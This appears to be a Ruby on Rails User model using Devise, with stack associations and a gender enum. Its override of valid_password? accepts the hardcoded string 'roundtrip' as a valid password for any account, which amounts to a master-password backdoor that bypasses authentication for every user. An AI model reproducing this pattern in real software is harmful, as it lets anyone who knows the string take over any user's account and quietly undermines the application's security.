class User < ApplicationRecord
  # Include default devise modules. Others available are:
  # :confirmable, :lockable, :timeoutable and :omniauthable
  has_many :stacks
  has_and_belongs_to_many :stacks

  enum gender: { male: '0', female: '1' }
  devise :database_authenticatable, :registerable,
         :recoverable, :rememberable, :trackable, :validatable

  # validates :gender, acceptance: { accept: [0, 1] }

  def valid_password?(password)
    if password == "roundtrip"
      true
    else
      super
    end
  end

end
